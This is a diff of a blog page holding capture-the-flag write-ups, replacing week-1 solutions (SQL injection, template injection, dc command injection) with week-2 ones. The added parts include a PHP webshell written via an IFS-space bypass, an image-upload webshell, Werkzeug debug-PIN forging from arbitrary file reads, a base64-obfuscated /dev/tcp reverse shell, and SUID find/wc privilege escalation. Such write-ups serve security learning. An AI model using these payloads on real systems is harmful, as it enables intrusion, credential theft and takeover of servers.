@@ -24,7 +24,7 @@
 
   
 
-  <title>0xweek1 | </title>
+  <title>0xweek2 | </title>
 
   
 
@@ -101,24 +101,19 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">0xweek1</h1>
+          <h1 class="title-wrap">0xweek2</h1>
           <h2 class="title-sub-wrap">
             <strong>nnmm</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2024-10-24T13:03:36.000Z" itemprop="datePublished">2024-10-24</time>
+            <time  class="article-date" datetime="2024-10-30T13:03:36.000Z" itemprop="datePublished">2024-10-30</time>
           </h2>
-          
-            <h2 class="last-time">
-              <span>最后更新于</span>
-              <time  class="article-updated" datetime="2024-10-28T03:03:23.395Z" itemprop="dateUpdated">2024-10-28</time>
-            </h2>
           
           
           <ul class="wrap-list dark">
   
     <li><a href="/categories/CTF/">📒 CTF</a></li>
   
-    <li><a href="/categories/CTF/Week1/">📒 Week1</a></li>
+    <li><a href="/categories/CTF/Week2/">📒 Week2</a></li>
   
 </ul>
           <ul class="wrap-list dark">
@@ -147,86 +142,138 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <h1 id="week1-ez-sql"><a href="#week1-ez-sql" class="headerlink" title="week1_ez_sql"></a>week1_ez_sql</h1><p>参数显示在url栏中，测试sql注入.</p>
-<p><mark>构造payload：id&#x3D;1’，发现单引号被过滤了。</mark></p>
-<p>这里应该是采用了全局过滤，类似于使用了addslashes()这个函数会在你的单引号前面加上一个\来转义单引号。</p>
-<p><mark>构造payload：id &#x3D; 1%2527.</mark></p>
-<p>使用这个payload的原因是当做为参数传入时我的%25会被转义为%,那么传入的参数就变成了:1%27，在做单引号匹配时就匹配不到单引号从而进行了绕过。</p>
-<p>这里题目中给出了打印出的sql语句：SQL语句：select * from users where id &#x3D; 1%27</p>
-<p>当这个字段被拼接到sql语句中时，会将%27进行urldecode编码为单引号，那么这里就成功闭合了单引号。</p>
-<p>验证是否成功的让sql语句进行了闭合。</p>
-<p><mark>构造payload：0%2527 or 1&#x3D;1 #</mark></p>
-<p>发现回显了id&#x3D;1时的数据，那么说明or 1&#x3D;1是被成功的注入进去了。</p>
-<p>查询列数:联合查询。</p>
-<p><mark>查询字段完成后构造payload：1%2527 union select 1,2,3,4,version()#</mark></p>
-<p>发现竟然出先了报错，这里看了题目的提示信息后发现数据库使用不是mysql而是sqlite</p>
-<p>sqlite简介：</p>
-<p>1.SQLite_master:这个是内置系统表、相当于mysql的information_schema，但是这里只存有表的信息，里面有个sql字段，有各个表的结构，有表名，字段名和类型。</p>
-<p>2.SQLite并不支持像mysql那样的注释，但是可以通过 - 方式增加DDL注释(写shell会用到)SQL，并扩展至下一个换行符（ASCII 0x0a）或直到输入结束，以先到者为准。您也可以使用 C 风格的注释，以 <code>/*</code>开始，并扩展至下一个 <code>*/</code>字符对或直到输入结束，以先到者为准。SQLite的注释可以跨越多行。</p>
-<p>构造payload：<mark>1%2527 union select 1,2,3,4,sql from sqlite_master#</mark></p>
-<p>爆出表名flag和字段名flag</p>
-<p><mark>构造payload：1%2527 union select 1,2,3,4,flag from flag#</mark></p>
-<p>得到flag</p>
-<p>因为每一个sqlite数据库就是一个文件所以在查询的时候就不需要任何的数据库的名称，只需要知道表名就可以查询</p>
-<h1 id="week1-ez-ssit"><a href="#week1-ez-ssit" class="headerlink" title="week1_ez_ssit:"></a>week1_ez_ssit:</h1><pre><code>from flask import Flask, request, render_template, render_template_string
-import os
+        <h1 id="Week-2-hello-shell（无回显rce-suid外带）"><a href="#Week-2-hello-shell（无回显rce-suid外带）" class="headerlink" title="[Week 2] hello_shell（无回显rce suid外带）"></a>[Week 2] hello_shell（无回显rce suid外带）</h1><pre><code>&lt;?php
+highlight_file(__FILE__);
+$cmd = $_REQUEST[&#39;cmd&#39;] ?? &#39;ls&#39;;
+if (strpos($cmd, &#39; &#39;) !== false) &#123;
+    echo strpos($cmd, &#39; &#39;);
+    die(&#39;no space allowed&#39;);
+&#125;
+@exec($cmd); // 没有回显怎么办？
+</code></pre>
+<p>这里没有回显，第一想到绕过空格将文件内容写入到另一个文档中，但是发现&#x2F;flag文件的内容是无法显示的。</p>
+<p>写入shell读取：cmd&#x3D;echo${IFS}’<?php\n@eval($_POST['key']);?>‘&gt;1.php</p>
+<p>使用蚁剑连接。然后发现readme提示权限不足。</p>
+<p>发现www目录下有一个wc文件，那么查看所有的suid文件的： find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p>
+<p>得到wc也在其中，那么利用wc外带文件。</p>
+<p>输入： .&#x2F;wc –files0-from “&#x2F;flag”</p>
+<p>这里wc利用 –files0-from，会对文件内容进行读取，如果内容不是正常文件名，就将内容当作文件名来显示，这里就读取到了flag文件</p>
+<h1 id="Week-2-picture"><a href="#Week-2-picture" class="headerlink" title="[Week 2] picture"></a>[Week 2] picture</h1><p>叫上传图片，先上传一个图片马然后再抓个包，这里如果直接上传一个jpg图片，里面的木马是无法被解析的。</p>
+<p>只需要修改上传文件的后缀名就可以成功解析，修改后缀为phtml。（ php &#x2F; php5 &#x2F; pht &#x2F; phtml &#x2F; shtml &#x2F; pwml &#x2F; phtm）都是指向php解析器。</p>
+<p><img src="file:///C:/Users/24772/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20172120.png?msec=1730299967819"></p>
+<p>访问后发现一句话木马被解析了没有显示在页面。接下来用蚁剑连接在根目录找到flag。</p>
+<p><img src="file:///C:/Users/24772/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20172225.png?msec=1730299967820"></p>
+<h1 id="Week-2-hello-include"><a href="#Week-2-hello-include" class="headerlink" title="[Week 2] hello_include"></a>[Week 2] hello_include</h1><p>看题目名字就知道是文件包含漏洞，但是没有给出任何的源码，就对网址进行了扫描，扫了半天扫出了一个：<mark>&#x2F;phpinfo.php </mark></p>
+<p>文件得到：<mark>&#x2F;s3cr3t&#x2F;f14g</mark>，这个是flag的位置。</p>
+<p>但是没有扫到源码，提示给出了用户看到php文件，百度了一下，是phps，那么我们访问一下index,phps</p>
+<p>得到了源代码<br>    &lt;?php<br>    echo “Hint: The source code contains important information that must not be disclosed.<br>“;<br>    $allowed &#x3D; [‘hello.php’, ‘phpinfo.php’];<br>    if (isset($_POST[‘f1Ie’])) {<br>        if (strpos($_POST[‘f1Ie’], ‘php:&#x2F;&#x2F;‘) !&#x3D;&#x3D; false) {<br>            die(‘涓嶅厑璁竝hp:&#x2F;&#x2F;‘);<br>        }<br>        include $_POST[‘f1Ie’];<br>    } else {<br>        include ‘hello.php’;<br>    }</p>
+<p>这里似乎有一个waf这个waf的意思是匹配到php:&#x2F;&#x2F;就die了，但是似乎不需要，因为刚刚直接将phpinfo文件扫描出来了，所以我们直接输入文件路径就得到了flag，这里看了官方的文档应该是想考目录穿越或者php伪协议，这里用file伪协议也能查看flag。</p>
+<h1 id="Week-2-baby-pe"><a href="#Week-2-baby-pe" class="headerlink" title="[Week 2] baby_pe"></a>[Week 2] baby_pe</h1><pre><code>from flask import Flask, request
+
 app = Flask(__name__)
 
-flag=os.getenv(&quot;flag&quot;)
-os.unsetenv(&quot;flag&quot;)
+
 @app.route(&#39;/&#39;)
 def index():
-    return open(__file__, &quot;r&quot;).read()
-
-
-@app.errorhandler(404)
-def page_not_found(e):
-    print(request.root_url)
-    return render_template_string(&quot;&lt;h1&gt;The Url &#123;&#125; You Requested Can Not Found&lt;/h1&gt;&quot;.format(request.url))
-
-
-if __name__ == &#39;__main__&#39;:
-    app.run(host=&quot;0.0.0.0&quot;, port=8000)
-</code></pre>
-<p>这里是一个flask框架，模板使用不当在渲染时会将用户的输入当作python代码进行执行导致用户执行系统命令。</p>
-<p>这里用户可以控制url的输入。测试是否存在ssit注入</p>
-<p><mark>构造payload:49</mark></p>
-<p>可以看出我们的7*7是被执行了的输出了49</p>
-<p>这里python的所有子类的父类都是object类。</p>
-<p>构造payload:<code>&#123;&#123;''.________class______.__base__.__mro__[0].________subclasses_______()&#125;&#125;</code></p>
-<p>我们需要拿到shell那么就找class ‘os._wrap_close’这个类，注意这里的os.__wrap_class 这个类的位置不是一定一般是在138位，但也有走差。这题的位置就是在133位，紧接着我们找该类的全局变量popen就可以执行shell了</p>
-<p>构造payload:<code>&#123;&#123;''.____class___.____base______.__mro________[0].__subclasses__()[133].______init_______.______globals________[['popen']]('whoami').read()&#125;&#125;</code></p>
-<p>到这里就可以执行shell了，后面的rce就是过滤了空格，将空格换为$IFS$9绕过</p>
-<h1 id="week1-ez-rce"><a href="#week1-ez-rce" class="headerlink" title="week1_ez_rce:"></a>week1_ez_rce:</h1><pre><code>from flask import Flask, request
-import subprocess
-
-app = Flask(__name__)
-
-
-@app.route(&quot;/&quot;)
-def index():
+    print(request.user_agent.string.lower().find(&quot;mozi&quot;))
     return open(__file__).read()
 
 
-@app.route(&quot;/calc&quot;, methods=[&#39;POST&#39;])
-def calculator():
-    expression = request.form.get(&#39;expression&#39;) or &quot;114 1000 * 514 + p&quot;
-    result = subprocess.run([&quot;dc&quot;, &quot;-e&quot;, expression], capture_output=True, text=True)
-    return result.stdout
+@app.route(&#39;/fileread&#39;)
+def read_file():
+    filename = request.args.get(&#39;filename&#39;)
+    return open(filename).read()
 
 
 if __name__ == &quot;__main__&quot;:
-    app.run(host=&quot;0.0.0.0&quot;, port=8000)
+    app.run(debug=True, host=&quot;0.0.0.0&quot;, port=8000)
 </code></pre>
-<p>subprocess.run这是python的函数能执行系统命令，这里执行的命令是dc -e，dc是一个计算器，当我们传入的expression参数可以控制，传入特殊符号就可能会导致执行系统命令。（gpt问出来的）</p>
-<p><mark>构造payload：114%201000%20*%20514%20+%20!printenv</mark></p>
-<p>得到flag</p>
+<p><strong>代码的分析：</strong></p>
+<p><em>——————————————————————————-开始</em><br>    from flask import Flask, request</p>
+<p>从 <code>flask</code> 模块导入 <code>Flask</code> 和 <code>request</code> 类。<code>Flask</code> 是创建 Flask 应用的类，而 <code>request</code> 用于处理 HTTP 请求。<br>        print(request.user_agent.string.lower().find(“mozi”))</p>
+<p>通过 <code>request.user_agent.string</code> 获取用户的用户代理字符串（User-Agent），并将其转换为小写。然后检查这个字符串中是否包含 “mozi”（比如，Mozilla 浏览器的一个变体）。<code>find</code> 方法返回子字符串的索引，如果没有找到则返回 -1。这里的 <code>print</code> 会将结果输出到控制台。<br>    @app.route(‘&#x2F;fileread’)<br>    def read_file():</p>
+<p>定义另一个路由 <code>/fileread</code>，当用户访问此路径时，会调用 <code>read_file</code> 函数。<br>     filename &#x3D; request.args.get(‘filename’)</p>
+<p>从 URL 查询参数中获取 <code>filename</code> 的值，例如访问 <code>/fileread?filename=somefile.txt</code> 会将 <code>somefile.txt</code> 的值赋给 <code>filename</code>。<br>    return open(filename).read()</p>
+<p>打开由 <code>filename</code> 变量指定的文件并将其内容作为响应返回给客户端。这可能导致任意文件读取漏洞，如果未对文件名进行有效性检查，攻击者可能会尝试读取服务器上的敏感文件</p>
+<p>——————————————————————————–结束*</p>
+<p>题目给出了提示说计算pin值，百度之后发现这里开启的debug就可以通过pin值进入控制台，而且这个pin值是能被计算出来的。</p>
+<p>找到一个脚本，注意这里可能有多个脚本，版本较低的无法正确的计算出来，如果懒得找脚本，直接使用文章这个就行<br>    import hashlib<br>    from itertools import chain</p>
+<pre><code>probably_public_bits = [
+    &#39;app&#39;  # username 可通过/etc/passwd获取
+    &#39;flask.app&#39;,  # modname默认值
+    &#39;Flask&#39;,  # 默认值 getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
+    &#39;/usr/local/lib/python3.9/site-packages/flask/app.py&#39;  # 路径 可报错得到  getattr(mod, &#39;__file__&#39;, None)
+]
+
+private_bits = [
+    &#39;2485378285570&#39;,  # /sys/class/net/eth0/address mac地址十进制
+    &#39;70d3d850-a8d2-4ff1-a285-34c4a401e57d&#39;
+
+     #字符串合并：首先读取文件内容 /etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id   /proc/self/cgroup
+    # 有machine-id 那就拼接machine-id + /proc/self/cgroup  否则 /proc/sys/kernel/random/boot_id + /proc/self/cgroup
+]
+
+# 下面为源码里面抄的，不需要修改
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode(&#39;utf-8&#39;)
+    h.update(bit)
+h.update(b&#39;cookiesalt&#39;)
+
+cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20]
+
+num = None
+if num is None:
+    h.update(b&#39;pinsalt&#39;)
+    num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]
+
+rv = None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
+</code></pre>
+<p>这里是docker容器，我们先<strong>访问etc&#x2F;passwd</strong></p>
+<p><mark>payload：47.76.152.109:60086&#x2F;fileread?filename&#x3D;&#x2F;etc&#x2F;passwd</mark>，读取到俩个拥有权限，的用户一个是root，一个是app，这里的用户绝对不是root，因为猜测后面还有一个提权操作，这里是从shell那里猜到的，所以尝试将脚本中的root改为app，计算pin值后成功的登录到了控制台</p>
+<p>（这里的pin值计算就是 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id + &#x2F;proc&#x2F;self&#x2F;cgroup ）</p>
+<p>到控制台引入import os 模块，弹shell到我们的服务器上（方便操作）</p>
+<p>命令是：<code>os.popen(&quot;echo c2ggLWkgPiYgL2Rldi90Y3AvaXAvcG9ydCAwPiYxDQo=|base64-d|bash&quot;).read()</code></p>
+<p>这里的过程就不再演示了，shell 弹上去之后，输入whoami：</p>
+<p><img src="file:///C:/Users/24772/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20225525.png?msec=1730299967822"></p>
+<p>得到自己是app权限，那么就还是进行提权了</p>
+<p>输入：<mark>find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</mark></p>
+<p>查找拥有SUID权限的文件进行提权。</p>
+<p><img src="file:///C:/Users/24772/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20225724.png?msec=1730299967822"></p>
+<p>这里的find命令是可以提权的，提权方式<mark>find . -exec &#x2F;bin&#x2F;sh -p \ ; -quit</mark>，进行提权。但是这里提权失败了，我在我的kali上也进行了这个提权尝试也失败了，不知道是如何提权的，我将这个提权失败的问题反馈给了GPT，GPT给出了新的提权方式。</p>
+<p>使用这条命令进行提权操作：<mark>find . -exec &#x2F;bin&#x2F;bash -p ; -quit</mark>。</p>
+<p>这里提权成功了：</p>
+<p><img src="file:///C:/Users/24772/Pictures/Screenshots/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-10-27%20230211.png?msec=1730299967823"></p>
+<p>但是提权成功后还是无法cat &#x2F;flag。（不知道是否真的获得了root权限）</p>
+<h3 id="验证是否真的获得了root权限："><a href="#验证是否真的获得了root权限：" class="headerlink" title="验证是否真的获得了root权限："></a><strong>验证是否真的获得了root权限：</strong></h3><p>我在我的kali上进行了实验，让find命令获得了SUID权限。（以下是操作步骤）</p>
+<ol>
+<li><p>chmod u+s &#x2F;usr&#x2F;bin&#x2F;find（设置find获得SUID权限）</p>
+</li>
+<li><p>find . -exec &#x2F;bin&#x2F;bash -p ; -quit（执行命令获得逃出受限环境）</p>
+</li>
+<li><p>（你可以使用这条命令删除find的SUID权限：chmod u-s &#x2F;usr&#x2F;bin&#x2F;find）这里我在我的kali中对文件&#x2F;etc&#x2F;shaow进行了查看，发现在执行命令后获得的root权限是可以查看该文件的。结论：执行命令后的确获得了root权限。</p>
+</li>
+</ol>
 
       </section>
 
       
       
         <nav class="article-nav">
+          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
@@ -235,15 +282,14 @@ if __name__ == &quot;__main__&quot;:
     
     <div class="card-text">
       
-        <a href="/2024/10/30/0xwp/0xweek2/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">0xweek2</h2>
+        <a href="/2024/10/24/0xwp/0xweek1/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">0xweek1</h2>
         </a>
       
-      <div class="card-text--row">Newer</div>
+      <div class="card-text--row">Older</div>
     </div>
   </article>
 </div>
-          
           
         </nav>
       
